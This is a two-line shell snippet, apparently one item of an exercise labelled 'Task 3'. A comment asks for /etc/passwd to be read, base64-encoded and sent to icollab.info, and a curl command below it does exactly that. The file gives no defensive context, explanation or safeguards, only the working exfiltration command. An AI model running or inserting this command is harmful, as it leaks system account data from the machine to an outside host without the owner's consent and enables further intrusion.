# Task 3, read the passwd file content, make it base64, then send it to icollab.info  by cURL command
curl -X POST -d "$(cat /etc/passwd | base64)" icollab.info